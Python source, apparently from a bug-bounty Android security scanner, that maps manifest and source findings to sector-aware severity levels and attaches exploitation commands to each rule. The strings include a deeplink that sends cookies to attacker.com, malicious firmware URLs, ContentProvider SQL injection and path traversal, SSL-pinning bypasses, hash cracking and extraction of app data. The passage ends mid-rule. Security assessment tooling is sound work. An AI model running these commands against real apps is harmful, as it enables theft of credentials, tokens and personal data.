import re
from typing import List, Dict, Any, Set, Optional


# ══════════════════════════════════════════════════════════════════
#  EscalationEngine v3 — Bug Bounty Grade
#  Covers: Finance, Healthcare, E-commerce, Auth, Social, OTA/MDM,
#          Transport, Government, Enterprise, Gaming
#  Components: Activity, Provider, Service, Receiver, WebView,
#              DeepLink, Crypto, Storage, Network, IPC, Native
# ══════════════════════════════════════════════════════════════════

class EscalationEngine:

    SEVERITY_ORDER = ["INFO", "LOW", "MEDIUM", "HIGH", "CRITICAL"]

    # ── Sector keyword maps ────────────────────────────────────────
    SECTOR_KEYWORDS = {
        "finance": [
            "pay", "payment", "otp", "bank", "transaction", "wallet", "upi",
            "credit", "debit", "finance", "checkout", "cart", "billing",
            "invoice", "purchase", "ecommerce", "edukaan", "dukaan", "ancillary",
            "dealer", "fleet", "insurance", "emi", "loan", "kyc", "neft", "rtgs",
            "razorpay", "paytm", "stripe", "gpay", "phonepe", "netbanking",
        ],
        "healthcare": [
            "health", "medical", "patient", "doctor", "prescription", "pharmacy",
            "hospital", "clinic", "diagnostic", "lab", "blood", "ehr",
            "emr", "telehealth", "telemedicine", "appointment", "wellness",
        ],
        "auth": [
            "login", "auth", "sso", "oauth", "saml", "jwt", "session",
            "password", "credential", "biometric", "fingerprint", "face",
            "2fa", "mfa", "otp", "pin", "passkey",
        ],
        "social": [
            "social", "chat", "message", "feed", "post", "comment", "profile",
            "friend", "follow", "dm", "notification", "story", "reel",
        ],
        "enterprise": [
            "enterprise", "mdm", "corp", "corporate", "employee", "hr",
            "payroll", "attendance", "vpn", "ldap", "ad", "saml", "okta",
            "directory", "workspace", "office",
        ],
        "transport": [
            "cab", "ride", "taxi", "bus", "train", "metro", "flight",
            "ticket", "travel", "trip", "map", "location", "gps", "vehicle",
            "driver", "route",
        ],
        "iot_ota": [
            "ota", "firmware", "update", "device", "iot", "sensor", "mqtt",
            "bluetooth", "ble", "wifi", "nfc", "vehicle", "car", "ev",
        ],
        "government": [
            "gov", "aadhaar", "pan", "voter", "ration", "certificate", "digilocker",
            "umang", "cowin", "nic", "ekyc", "dsc",
        ],
    }

    FINANCE_PERMISSIONS = [
        "SEND_SMS", "RECEIVE_SMS", "READ_SMS",
        "READ_CONTACTS", "READ_PHONE_STATE",
        "USE_BIOMETRIC", "USE_FINGERPRINT",
        "BIND_AUTOFILL_SERVICE",
    ]

    WEBVIEW_PATTERNS = [
        r"webview", r"web_view", r"browser", r"flutter.*url",
        r"urllauncher", r"url.*launcher", r"chrome.*custom.*tab",
        r"cct", r"link_handler", r"deep.*link",
    ]

    DEEPLINK_IDS   = {"MF-040", "MF-041", "MF-042", "MF-043"}
    PROVIDER_IDS   = {"MF-010", "MF-011", "MF-060", "MF-061"}
    SERVICE_IDS    = {"MF-015", "MF-016", "MF-017"}
    RECEIVER_IDS   = {"MF-012", "MF-013", "MF-014"}
    CRYPTO_IDS     = {"SRC-010", "SRC-011", "SRC-012", "SRC-013", "SRC-014"}
    STORAGE_IDS    = {"SRC-030", "SRC-031", "SRC-032", "SRC-033"}
    NATIVE_IDS     = {"SRC-070", "SRC-071", "SRC-072"}
    BACKUP_IDS     = {"MF-020", "MF-021"}
    NETWORK_IDS    = {"MF-003", "MF-034", "SRC-022", "SRC-023"}
    EXPORTED_IDS   = {"MF-007", "MF-064", "MF-086"}
    PENDING_INTENT_IDS = {"ADV-PI-001", "ADV-PI-002", "ADV-PI-003", "ADV-PI-004",
                          "ADV-003", "ADV-004", "SRC-051", "SYS-004", "SYS-005"}

    def __init__(self):
        self.escalations: List[Dict[str, Any]] = []
        self._escalated_ids: Set[str] = set()

    # ─────────────────────────────────────────────
    # Public entry point
    # ─────────────────────────────────────────────
    def analyze(
        self,
        manifest_findings: List[Dict],
        source_findings:   List[Dict],
        pkg:               str,
        app_name:          str        = "",
        permissions:       List[str]  = None,
        target_sdk_version: int       = None,
    ) -> List[Dict]:
        self.escalations = []
        all_findings = manifest_findings + source_findings
        permissions  = permissions or []

        # ── Detect sectors ────────────────────────────────────────
        ctx = self._detect_sectors(pkg, app_name, permissions)

        # ── Build lookup sets ─────────────────────────────────────
        fids   = {f.get("id", "") for f in all_findings}
        fnames = {(f.get("name") or "").lower() for f in all_findings}
        comps  = self._extract_components(all_findings)

        # ── Derived flags ─────────────────────────────────────────
        fl = self._build_flags(fids, fnames, comps, permissions, target_sdk_version, all_findings)

        # ── Apply all rules ───────────────────────────────────────
        self._escalated_ids.clear()
        for f in all_findings:
            self._apply_rules(f, ctx, fl, comps, fids)

        return all_findings

    # ─────────────────────────────────────────────
    # Rule dispatcher
    # ─────────────────────────────────────────────
    def _apply_rules(self, f: Dict, ctx: Dict, fl: Dict, comps: List[str], fids: Set[str]):
        fid  = f.get("id", "")
        conf = f.get("confidence", 50)
        # Let all rules fire; _esc only upgrades, so highest severity wins naturally.

        # ════════════════════════════════════════════════════
        #  GROUP A — ACTIVITY / IPC RULES
        # ════════════════════════════════════════════════════

        # A1: Exported Activity + WebView on same component → CRITICAL
        if fid in self.EXPORTED_IDS:
            _webview_on_same_comp = False
            for m in (f.get("matches") or []):
                if isinstance(m, str):
                    for a in re.findall(r"""android:name=['"]([^'"]*)['"]""", m):
                        if any(re.search(p, a, re.IGNORECASE) for p in self.WEBVIEW_PATTERNS):
                            _webview_on_same_comp = True
            if _webview_on_same_comp:
                self._esc(f, "CRITICAL", "A1-EXPORTED-WEBVIEW",
                    "Exported activity with WebView component reachable",
                    "adb shell am start -n {pkg}/{webview_comp} --es url 'javascript:alert(document.domain)'\n"
                    "adb shell am start -n {pkg}/{webview_comp} --es url 'file:///data/data/{pkg}/shared_prefs/'",
                    "Arbitrary URL/JS injection → XSS, local file read, RCE via JS interface",
                    conf)

        # A2: Exported Activity + Finance/Auth context → HIGH
        if fid in self.EXPORTED_IDS and (ctx.get("finance") or ctx.get("auth")):
            self._esc(f, "HIGH", "A2-EXPORTED-SENSITIVE-CONTEXT",
                "Exported activity in finance/auth app — auth bypass possible",
                "adb shell am start -n {pkg}/.MainActivity\n"
                "# Skip login screen if Activity checks auth AFTER launch",
                "Attacker launches app directly to post-auth screens (dashboard, wallet, settings)",
                conf)

        # A3: Exported Activity + FLAG_SECURE missing + Finance → HIGH
        if fid in self.EXPORTED_IDS and ctx.get("finance") and not fl.get("has_flag_secure"):
            self._esc(f, "HIGH", "A3-NO-FLAG-SECURE-FINANCE",
                "No FLAG_SECURE on financial activity — screen capture possible",
                "Use MediaProjection API from malicious app to record screen while payment is open",
                "OTP, PIN, card details captured via screen recording",
                conf)

        # A4a: Task Affinity empty + Finance + pre-Android 12 → MEDIUM (base task hijacking)
        if fid == "MF-037" and ctx.get("finance") and not fl.get("is_android_12_plus") and not fl.get("has_task_reparenting"):
            self._esc(f, "MEDIUM", "A4A-TASK-AFFINITY-FINANCE",
                "Empty taskAffinity in financial app → Task Hijacking (pre-Android 12, no allowTaskReparenting)",
                "adb shell am start -n {pkg}/.MainActivity --activity-task-on-home\n"
                "# Malicious app with same empty taskAffinity can overlay UI",
                "Malicious app overlays fake payment/OTP UI on top of real app",
                conf)

        # A4b: Task Affinity empty + allowTaskReparenting + Finance + pre-Android 12 → CRITICAL (StrandHogg 2.0)
        if fid == "MF-037" and fl.get("has_task_reparenting") and ctx.get("finance") and not fl.get("is_android_12_plus"):
            self._esc(f, "CRITICAL", "A4B-STRANDHOGG-FINANCE",
                "Empty taskAffinity + allowTaskReparenting in financial app → StrandHogg 2.0 UI redressing",
                "adb shell am start -n {pkg}/.MainActivity --activity-task-on-home\n"
                "# Creates overlay with fake payment screen — user enters OTP on attacker-controlled UI",
                "StrandHogg 2.0: Activity hijacked to attacker task → fake OTP/payment UI → credential theft",
                conf)

        # A4c: MF-116 (allowTaskReparenting standalone) + Finance → HIGH
        if fid == "MF-116" and ctx.get("finance") and not fl.get("is_android_12_plus"):
            self._esc(f, "HIGH", "A4C-REPARENT-FINANCE",
                "allowTaskReparenting in financial app — activity can move between tasks for UI spoofing",
                "adb shell am start -n {pkg}/.MainActivity\n# Activity can be reparented to attacker task when it comes to foreground",
                "Attacker app declares same taskAffinity and when its task comes foreground, vulnerable activity reparents into it",
                conf)

        # A5: Task Affinity empty + Touch Filter missing + pre-Android 12 → HIGH (Tapjacking chain)
        if fid == "MF-037" and fl.get("touch_filter_missing") and not fl.get("is_android_12_plus"):
            self._esc(f, "HIGH", "A5-TAPJACKING-CHAIN",
                "Task Affinity empty + Touch filtering off = Tapjacking",
                "Deploy malicious overlay app with SYSTEM_ALERT_WINDOW, place transparent view over CTA buttons",
                "User taps malicious button believing they confirm legit transaction",
                conf)

        # A6: Activity Hidden from Recents (excludeFromRecents) + Finance/Healthcare → HIGH
        if fid == "MF-044" and (ctx.get("finance") or ctx.get("healthcare")):
            self._esc(f, "HIGH", "A6-RECENTS-HIDDEN",
                "Activity hidden from recents in regulated app — anti-forensics / user unaware of background activity",
                "Check if app hides legitimate payment/patient screens from recents as anti-forensics measure\n"
                "# Hidden activity can keep running without user noticing in task switcher",
                "Hidden activities prevent user from detecting background data exfiltration or unauthorized transactions in task switcher",
                conf)

        # A7: Exported Activity + Government app → CRITICAL
        if fid in self.EXPORTED_IDS and ctx.get("government"):
            self._esc(f, "CRITICAL", "A7-GOVT-EXPORTED",
                "Exported activity in government app — Aadhaar/PAN data at risk",
                "adb shell am start -n {pkg}/.MainActivity\n"
                "drozer console connect --command \"run app.activity.start --component {pkg} .MainActivity\"",
                "Bypass auth to access Aadhaar, PAN, voter data — classified HIGH risk by CERT-In",
                conf)

        # A8: Exported Activity + OTA/IoT → CRITICAL (firmware update hijack)
        if fid in self.EXPORTED_IDS and ctx.get("iot_ota"):
            self._esc(f, "CRITICAL", "A8-EXPORTED-OTA",
                "Exported activity in OTA/IoT app — firmware/boot flow accessible",
                "adb shell am start -n {pkg}/.UpdateActivity --es update_url 'https://attacker.com/malicious.bin'",
                "Attacker triggers OTA update flow with malicious firmware URL — device firmware takeover",
                conf)

        # A9: Exported Activity + Enterprise/MDM → HIGH
        if fid in self.EXPORTED_IDS and ctx.get("enterprise"):
            self._esc(f, "HIGH", "A9-EXPORTED-ENTERPRISE",
                "Exported activity in MDM/Enterprise app — corporate data accessible",
                "adb shell am start -n {pkg}/.EmployeeListActivity\n"
                "adb shell am start -n {pkg}/.VpnConfigActivity",
                "Corporate employee data, VPN config, admin panels accessible without auth",
                conf)

        # A10: Exported Activity + Social (profile view) → MEDIUM
        if fid in self.EXPORTED_IDS and ctx.get("social"):
            self._esc(f, "MEDIUM", "A10-EXPORTED-SOCIAL",
                "Exported activity in social app — profile data accessible via deep link",
                "adb shell am start -n {pkg}/.ProfileActivity --ei user_id 1337",
                "View any user profile without authentication — PII enumeration",
                conf)

        # ════════════════════════════════════════════════════
        #  GROUP B — CONTENT PROVIDER RULES
        # ════════════════════════════════════════════════════

        # B1: Exported Provider + no permission → HIGH
        if fid in self.PROVIDER_IDS and not fl.get("permission_on_provider"):
            self._esc(f, "HIGH", "B1-PROVIDER-NO-PERMISSION",
                "Content Provider exported without permission — data leak",
                "adb shell content query --uri content://{pkg}.provider/\n"
                "adb shell content query --uri content://{pkg}/users\n"
                "drozer console connect --command \"run app.provider.read -a {pkg}\"",
                "Any app reads app database, user data, tokens via ContentProvider",
                conf)

        # B2: Exported Provider + SQL Injection signals → CRITICAL
        if fid in self.PROVIDER_IDS and fl.get("has_sqli_signal"):
            self._esc(f, "CRITICAL", "B2-PROVIDER-SQLI",
                "Exported ContentProvider with SQL injection indicators",
                "adb shell content query --uri content://{pkg}.provider/users --where \"1=1\"\n"
                "drozer console connect --command \"run app.provider.query -a {pkg} --selection \\\"1=1--\\\"\"",
                "SQL injection via ContentProvider selection clause — full DB dump possible",
                conf)

        # B3: Provider + path traversal keywords → HIGH
        if fid in self.PROVIDER_IDS and fl.get("has_file_provider"):
            self._esc(f, "HIGH", "B3-PROVIDER-PATH-TRAVERSAL",
                "FileProvider may expose internal files via path traversal",
                "adb shell content read --uri content://{pkg}.fileprovider/../shared_prefs/creds.xml",
                "Read internal SharedPreferences, DB, tokens via malformed FileProvider URI",
                conf)

        # B4: Provider + Healthcare → CRITICAL (PHI leak)
        if fid in self.PROVIDER_IDS and ctx.get("healthcare"):
            self._esc(f, "CRITICAL", "B4-PROVIDER-HEALTHCARE",
                "Exported ContentProvider in healthcare app — PHI exposed to all apps",
                "adb shell content query --uri content://{pkg}/patients/\n"
                "drozer console connect --command \"run app.provider.read -a {pkg}\"",
                "Patient records, diagnoses, prescriptions exposed to every app on device — HIPAA violation",
                conf)

        # B5: Provider + Government → CRITICAL (citizen data)
        if fid in self.PROVIDER_IDS and ctx.get("government"):
            self._esc(f, "CRITICAL", "B5-PROVIDER-GOVERNMENT",
                "Exported ContentProvider in govt app — citizen PII exposed",
                "adb shell content query --uri content://{pkg}/aadhaar/\n"
                "content query --uri content://{pkg}/voter/",
                "Aadhaar numbers, PAN, voter IDs exposed to every app on device — CERT-In critical",
                conf)

        # B6: Provider + Enterprise/Employee data → HIGH
        if fid in self.PROVIDER_IDS and ctx.get("enterprise"):
            self._esc(f, "HIGH", "B6-PROVIDER-ENTERPRISE",
                "ContentProvider in enterprise app — employee data accessible",
                "adb shell content query --uri content://{pkg}/employees/\n"
                "adb shell content query --uri content://{pkg}/salaries/",
                "Employee names, salaries, HR records exposed to malicious apps on same device",
                conf)

        # ════════════════════════════════════════════════════
        #  GROUP C — SERVICE RULES
        # ════════════════════════════════════════════════════

        # C1: Exported Service + no permission → HIGH
        if fid in self.SERVICE_IDS and not fl.get("permission_on_service"):
            self._esc(f, "HIGH", "C1-SERVICE-NO-PERMISSION",
                "Exported Service without permission — any app can bind/start",
                "adb shell am startservice -n {pkg}/.SomeService\n"
                "drozer console connect --command \"run app.service.start --component {pkg} .SomeService\"",
                "Attacker triggers privileged background operations (data sync, OTA, payment)",
                conf)

        # C2: Exported Service + IoT/OTA context → CRITICAL
        if fid in self.SERVICE_IDS and ctx.get("iot_ota"):
            self._esc(f, "CRITICAL", "C2-SERVICE-OTA",
                "Exported Service in OTA/IoT app — firmware update hijack possible",
                "adb shell am startservice -n {pkg}/.UpdateService --es firmware_url https://attacker.com/evil.bin",
                "Trigger firmware update from attacker-controlled server — device takeover",
                conf)

        # C3: Exported Service + Enterprise/MDM → CRITICAL
        if fid in self.SERVICE_IDS and ctx.get("enterprise"):
            self._esc(f, "CRITICAL", "C3-SERVICE-ENTERPRISE",
                "Exported Service in MDM/Enterprise app — policy bypass or data access",
                "drozer console connect --command \"run app.service.start --component {pkg} .PolicyService\"",
                "Bypass MDM enrollment, access enterprise data, wipe device commands",
                conf)

        # C4: Exported Service + Finance (transaction service) → CRITICAL
        if fid in self.SERVICE_IDS and ctx.get("finance"):
            self._esc(f, "CRITICAL", "C4-SERVICE-FINANCE",
                "Exported service in financial app — payment/transaction service exposed",
                "adb shell am startservice -n {pkg}/.PaymentService --ei amount 99999 --ei to_account 1337",
                "Start payment transaction with attacker-controlled params — unauthorized money transfer",
                conf)

        # C5: Exported Service + Transport/Vehicle → HIGH (GPS tracking)
        if fid in self.SERVICE_IDS and ctx.get("transport"):
            self._esc(f, "HIGH", "C5-SERVICE-TRANSPORT",
                "Exported service in transport app — location/GPS data accessible",
                "adb shell am startservice -n {pkg}/.LocationService\n"
                "adb shell am startservice -n {pkg}/.TripService --es action 'start_trip' --ei driver_id 1",
                "Attacker triggers trip start, access real-time location, spoof driver assignment",
                conf)

        # ════════════════════════════════════════════════════
        #  GROUP D — BROADCAST RECEIVER RULES
        # ════════════════════════════════════════════════════

        # D1: Exported Receiver in sensitive context → LOW (not unconditional)
        if fid in self.RECEIVER_IDS and (ctx.get("finance") or ctx.get("healthcare") or
                                         ctx.get("auth") or ctx.get("government") or
                                         ctx.get("enterprise")):
            self._esc(f, "LOW", "D1-RECEIVER-SENSITIVE",
                "Exported BroadcastReceiver in sensitive app — spoofed intents possible",
                "adb shell am broadcast -a {pkg}.SOME_ACTION\n"
                "drozer console connect --command \"run app.broadcast.send --component {pkg} .SomeReceiver\"",
                "Attacker sends spoofed broadcast → trigger logout, clear data, fake notifications",
                conf)

        # D2: Exported Receiver + Finance + SMS action → CRITICAL
        if fid in self.RECEIVER_IDS and ctx.get("finance") and fl.get("has_sms_receiver"):
            self._esc(f, "CRITICAL", "D2-SMS-RECEIVER-FINANCE",
                "SMS BroadcastReceiver in financial app — OTP interception possible",
                "adb shell am broadcast -a android.provider.Telephony.SMS_RECEIVED --es pdus '<crafted_pdu>'",
                "Malicious app intercepts OTP before financial app reads it — account takeover",
                conf)

        # D3: Receiver + BOOT_COMPLETED + persistence → MEDIUM
        if fid in self.RECEIVER_IDS and fl.get("has_boot_receiver"):
            self._esc(f, "MEDIUM", "D3-BOOT-RECEIVER-PERSISTENCE",
                "BOOT_COMPLETED receiver — malware persistence vector if app compromised",
                "adb shell am broadcast -a android.intent.action.BOOT_COMPLETED -p {pkg}",
                "Persistent execution on every device boot — useful in malware chaining",
                conf)

        # D4: Receiver + Finance + CONNECTIVITY_CHANGE → HIGH
        if fid in self.RECEIVER_IDS and ctx.get("finance") and fl.get("has_connectivity_receiver"):
            self._esc(f, "HIGH", "D4-RECEIVER-CONNECTIVITY-FINANCE",
                "Connectivity receiver in financial app — transaction state manipulation",
                "adb shell am broadcast -a android.net.conn.CONNECTIVITY_CHANGE\n"
                "# Trigger sync/logic on network state change",
                "Trigger payment sync, transaction retry, or logout logic via network state spoofing",
                conf)

        # ════════════════════════════════════════════════════
        #  GROUP E — DEEPLINK RULES
        # ════════════════════════════════════════════════════

        # E1: DeepLink in sensitive context → MEDIUM (not unconditional)
        if fid in self.DEEPLINK_IDS and (ctx.get("finance") or ctx.get("healthcare") or
                                         ctx.get("auth") or ctx.get("government") or
                                         ctx.get("enterprise") or fl.get("has_webview")):
            self._esc(f, "MEDIUM", "E1-DEEPLINK-SENSITIVE",
                "Exported DeepLink with no input validation in sensitive app",
                "adb shell am start -a android.intent.action.VIEW -d 'yourscheme://action?redirect=https://attacker.com'\n"
                "adb shell am start -a android.intent.action.VIEW -d 'yourscheme://file?path=../../shared_prefs/'\n"
                "adb shell am start -a android.intent.action.VIEW -d 'yourscheme://page?url=javascript:alert(1)'",
                "Open redirect, path traversal, XSS via unvalidated deeplink parameters",
                conf)

        # E2: DeepLink + Finance/Auth → HIGH (account takeover via token in URL)
        if fid in self.DEEPLINK_IDS and (ctx.get("finance") or ctx.get("auth")):
            self._esc(f, "HIGH", "E2-DEEPLINK-TOKEN-LEAK",
                "DeepLink in auth/finance app — tokens in URL leaked to referrer logs",
                "# Craft link with token: yourscheme://callback?token=<victim_token>\n"
                "# If app processes token from URL → account takeover\n"
                "adb shell am start -a android.intent.action.VIEW -d 'yourscheme://auth?access_token=STOLEN'",
                "Auth tokens passed via deeplink URL exposed in server logs, Referer headers, and intent history",
                conf)

        # E3: DeepLink + WebView → CRITICAL
        if fid in self.DEEPLINK_IDS and fl.get("has_webview"):
            self._esc(f, "CRITICAL", "E3-DEEPLINK-WEBVIEW-XSS",
                "DeepLink URL passed directly to WebView — reflected XSS/RCE",
                "adb shell am start -a android.intent.action.VIEW "
                "-d 'yourscheme://open?url=javascript:fetch(\"https://attacker.com?c=\"+document.cookie)'",
                "Deeplink parameter flows into WebView.loadUrl() without sanitization → XSS → JS bridge RCE",
                conf)

        # E4: DeepLink + Transport (ride booking) → HIGH
        if fid in self.DEEPLINK_IDS and ctx.get("transport"):
            self._esc(f, "HIGH", "E4-DEEPLINK-TRANSPORT",
                "DeepLink in transport app — trip params injection",
                "adb shell am start -a android.intent.action.VIEW "
                "-d 'cabapp://book?pickup=attacker_location&dest=victim_home'",
                "Forge trip booking params to redirect driver or access ride history",
                conf)

        # E5: DeepLink + IoT/OTA → CRITICAL
        if fid in self.DEEPLINK_IDS and ctx.get("iot_ota"):
            self._esc(f, "CRITICAL", "E5-DEEPLINK-IOT",
                "DeepLink in IoT app — device control commands injectable",
                "adb shell am start -a android.intent.action.VIEW "
                "-d 'iotapp://control?device=all&command=lock&unlock=true'",
                "Inject device control commands via malformed deeplink — unlock doors, disable alarms",
                conf)

        # ════════════════════════════════════════════════════
        #  GROUP F — NETWORK / SSL RULES
        # ════════════════════════════════════════════════════

        # F1: No NSC + Cleartext + Finance → HIGH
        if fid in ("MF-003", "MF-034") and ctx.get("finance") and fl.get("has_cleartext"):
            self._esc(f, "HIGH", "F1-CLEARTEXT-FINANCE",
                "Cleartext traffic in financial app — MITM intercepts credentials",
                "1. Set Burp CA on emulator\n2. Route traffic via Burp proxy\n3. Observe plaintext auth/payment traffic",
                "Credentials, tokens, card data transmitted over HTTP — interceptable on any network",
                conf)

        # F2: Cleartext + no SSL pinning → HIGH
        if fid == "MF-003" and not fl.get("has_ssl_pinning"):
            self._esc(f, "HIGH", "F2-CLEARTEXT-NO-PINNING",
                "Cleartext allowed + no certificate pinning = trivial MITM",
                "frida -U -n {pkg} -l ssl_bypass.js && mitmproxy -p 8080",
                "App accepts any certificate including self-signed — full traffic decryption",
                conf)

        # F3: SSL pinning missing in Finance/Healthcare → HIGH (even if HTTPS)
        if fid in ("SRC-022", "SRC-023") and (ctx.get("finance") or ctx.get("healthcare")):
            self._esc(f, "HIGH", "F3-NO-PINNING-REGULATED",
                "No certificate pinning in regulated app (finance/healthcare)",
                "frida -U -n {pkg} -l ssl_bypass.js\n"
                "objection -g {pkg} explore -- android sslpinning disable",
                "MITM possible with any trusted CA — intercept PII, PHI, financial data",
                conf)

        # F4: Cleartext + Healthcare → CRITICAL (HIPAA/PHI)
        if fid == "MF-003" and ctx.get("healthcare"):
            self._esc(f, "CRITICAL", "F4-CLEARTEXT-HEALTHCARE",
                "Cleartext traffic in healthcare app — PHI transmitted without encryption",
                "Set up Burp proxy → capture patient records, prescriptions, diagnoses in HTTP",
                "HIPAA violation — Protected Health Information in cleartext = regulatory + bug bounty critical",
                conf)

        # F5: Cleartext + Enterprise → HIGH (corporate SSO tokens)
        if fid == "MF-003" and ctx.get("enterprise"):
            self._esc(f, "HIGH", "F5-CLEARTEXT-ENTERPRISE",
                "Cleartext in enterprise app — corporate SSO tokens in HTTP",
                "Route enterprise app traffic through Burp → capture SSO tokens, VPN creds, AD creds",
                "Corporate identity tokens intercepted → full enterprise account compromise",
                conf)

        # F6: No NSC + Government → CRITICAL (citizen PII)
        if fid == "MF-034" and ctx.get("government"):
            self._esc(f, "CRITICAL", "F6-NO-NSC-GOVERNMENT",
                "No Network Security Config in government app — MITM on citizen PII",
                "Install Burp CA on device → intercept Aadhaar/linked service data in HTTP",
                "Aadhaar numbers, PAN, voter IDs transmitted over vulnerable connection — CERT-In directive violation",
                conf)

        # ════════════════════════════════════════════════════
        #  GROUP G — CRYPTOGRAPHY RULES
        # ════════════════════════════════════════════════════

        # G1: Hardcoded key/IV + Finance → HIGH
        if fid in self.CRYPTO_IDS and ctx.get("finance"):
            self._esc(f, "HIGH", "G1-HARDCODED-CRYPTO-FINANCE",
                "Hardcoded crypto key/IV in financial app — encrypted data decryptable",
                "# Extract key from APK strings:\n"
                "strings classes.dex | grep -E '[A-Fa-f0-9]{32,}'\n"
                "jadx -d out/ app.apk && grep -r 'SecretKeySpec\\|IvParameterSpec' out/",
                "Attacker extracts hardcoded key → decrypts locally stored tokens, card data, session keys",
                conf)

        # G2: Weak algorithm (ECB/MD5/SHA1) + Auth → HIGH
        if fid in self.CRYPTO_IDS and ctx.get("auth"):
            self._esc(f, "HIGH", "G2-WEAK-CRYPTO-AUTH",
                "Weak crypto algorithm in auth context — password hash crackable",
                "Extract DB: adb shell run-as {pkg} cat databases/app.db | base64\n"
                "Then: hashcat -m 0 hashes.txt rockyou.txt  (MD5 crack)",
                "MD5/SHA1 password hashes cracked offline — account takeover",
                conf)

        # G3: ECB mode + any sensitive data → HIGH
        if fid in self.CRYPTO_IDS and fl.get("has_ecb_mode"):
            self._esc(f, "HIGH", "G3-ECB-MODE",
                "ECB cipher mode detected — pattern leakage in encrypted data",
                "# Capture two identical plaintext blocks → identical ciphertext blocks\n"
                "# Enables chosen-plaintext attack and data pattern analysis",
                "ECB mode reveals patterns in ciphertext — partial plaintext recovery possible",
                conf)

        # G4: Hardcoded key + Government → CRITICAL
        if fid in self.CRYPTO_IDS and ctx.get("government"):
            self._esc(f, "CRITICAL", "G4-HARDCODED-CRYPTO-GOVT",
                "Hardcoded crypto in government app — encrypted citizen DB decryptable",
                "# Aadhaar/PAN data encrypted with hardcoded key found in code\n"
                "# Extract key from smali/jadx output and decrypt local DB",
                "All encrypted citizen records decryptable with key found in APK — massive PII leak",
                conf)

        # G5: Hardcoded key + IoT/OTA → HIGH (device control)
        if fid in self.CRYPTO_IDS and ctx.get("iot_ota"):
            self._esc(f, "HIGH", "G5-HARDCODED-CRYPTO-IOT",
                "Hardcoded crypto key in IoT app — device communication decryptable",
                "Extract key from APK → decode device commands → spoof sensor data",
                "Control IoT devices, inject false sensor data, bypass secure firmware update",
                conf)

        # ════════════════════════════════════════════════════
        #  GROUP H — STORAGE RULES
        # ════════════════════════════════════════════════════

        # H1: Insecure SharedPreferences + Finance → HIGH
        if fid in self.STORAGE_IDS and ctx.get("finance"):
            self._esc(f, "HIGH", "H1-INSECURE-STORAGE-FINANCE",
                "Plaintext storage in SharedPreferences in financial app",
                "adb shell run-as {pkg} cat shared_prefs/*.xml\n"
                "# Or if not debuggable, with root:\n"
                "adb shell su -c 'cat /data/data/{pkg}/shared_prefs/*.xml'",
                "Auth tokens, user PII, API keys stored in plaintext — extractable without root on debug builds",
                conf)

        # H2: SQLite plaintext + Healthcare → CRITICAL
        if fid in self.STORAGE_IDS and ctx.get("healthcare"):
            self._esc(f, "CRITICAL", "H2-SQLITE-PLAINTEXT-HEALTHCARE",
                "Unencrypted SQLite DB in healthcare app — PHI at rest unprotected",
                "adb shell run-as {pkg} cp databases/app.db /sdcard/\n"
                "adb pull /sdcard/app.db && sqlite3 app.db .dump",
                "Patient records, diagnoses, prescriptions in plaintext DB — HIPAA violation",
                conf)

        # H3: External storage write + sensitive data → HIGH
        if fid in self.STORAGE_IDS and fl.get("has_external_storage"):
            self._esc(f, "HIGH", "H3-EXTERNAL-STORAGE-SENSITIVE",
                "Sensitive data written to external storage (world-readable)",
                "adb shell ls /sdcard/Android/data/{pkg}/\n"
                "adb pull /sdcard/Android/data/{pkg}/",
                "Any app with READ_EXTERNAL_STORAGE can access files written to /sdcard/",
                conf)

        # H4: Log statements + sensitive data (Finance/Auth) → HIGH
        if fid in self.STORAGE_IDS and fl.get("has_log_leak") and (ctx.get("finance") or ctx.get("auth")):
            self._esc(f, "HIGH", "H4-LOG-SENSITIVE-DATA",
                "Sensitive data printed to logcat in finance/auth app",
                "adb logcat -s {pkg} | grep -iE 'token|password|otp|key|secret|card'",
                "Auth tokens, OTPs, passwords visible in ADB logcat — accessible to any app with READ_LOGS",
                conf)

        # H5: Insecure storage + Government → CRITICAL
        if fid in self.STORAGE_IDS and ctx.get("government"):
            self._esc(f, "CRITICAL", "H5-STORAGE-GOVERNMENT",
                "Unencrypted storage in government app — citizen PII at rest",
                "adb shell run-as {pkg} cat databases/aadhaar.db\n"
                "adb shell run-as {pkg} cat shared_prefs/pan.xml",
                "Aadhaar numbers, PAN, Ration card data in plaintext — massive identity leak",
                conf)

        # H6: Insecure storage + Social → MEDIUM
        if fid in self.STORAGE_IDS and ctx.get("social"):
            self._esc(f, "MEDIUM", "H6-STORAGE-SOCIAL",
                "Plaintext storage in social app — private messages, contacts accessible",
                "adb shell run-as {pkg} cat databases/chat.db\n"
                "adb shell run-as {pkg} cat shared_prefs/session.xml",
                "Private chat history, contacts, session tokens readable from storage",
                conf)

        # H7: Insecure storage + Transport → HIGH (trip history, location)
        if fid in self.STORAGE_IDS and ctx.get("transport"):
            self._esc(f, "HIGH", "H7-STORAGE-TRANSPORT",
                "Plaintext storage in transport app — trip history, payment data exposed",
                "adb shell run-as {pkg} cat databases/trip_history.db\n"
                "adb shell run-as {pkg} cat shared_prefs/card_details.xml",
                "Trip history, home/work addresses, saved payment methods in plaintext",
                conf)

        # ════════════════════════════════════════════════════
        #  GROUP I — BACKUP / DATA EXTRACTION RULES
        # ════════════════════════════════════════════════════

        # I1: Backup enabled + no extraction rules + Finance → HIGH
        if fid in self.BACKUP_IDS and ctx.get("finance") and fl.get("backup_no_exclusions"):
            self._esc(f, "HIGH", "I1-BACKUP-FINANCE",
                "Auto backup enabled in financial app — tokens/credentials backed to Google Drive",
                "adb backup -f backup.ab -noapk {pkg}\n"
                "java -jar abe.jar unpack backup.ab backup.tar && tar xf backup.tar\n"
                "cat apps/{pkg}/sp/*.xml",
                "All SharedPreferences + DBs backed up — attacker restores on rooted device to extract tokens",
                conf)

        # I2: Backup + Healthcare → CRITICAL
        if fid in self.BACKUP_IDS and ctx.get("healthcare"):
            self._esc(f, "CRITICAL", "I2-BACKUP-HEALTHCARE",
                "Auto backup in healthcare app exposes PHI to cloud backup",
                "adb backup -f backup.ab -noapk {pkg} && unpack → read patient DB",
                "Patient records backed to Google Drive without encryption — HIPAA breach",
                conf)

        # I3: Debuggable + ADB backup → CRITICAL
        if fid == "MF-001" and fl.get("backup_no_exclusions"):
            self._esc(f, "CRITICAL", "I3-DEBUGGABLE-BACKUP",
                "App is debuggable + backup enabled — full data extraction without root",
                "adb backup -f out.ab {pkg}\n"
                "adb shell run-as {pkg} cp /data/data/{pkg}/databases/main.db /sdcard/",
                "No root needed — debuggable apps allow run-as to copy any internal file",
                conf)

        # I4: Backup + Government → CRITICAL
        if fid in self.BACKUP_IDS and ctx.get("government"):
            self._esc(f, "CRITICAL", "I4-BACKUP-GOVERNMENT",
                "Auto backup enabled in government app — Aadhaar/PAN data in cloud backup",
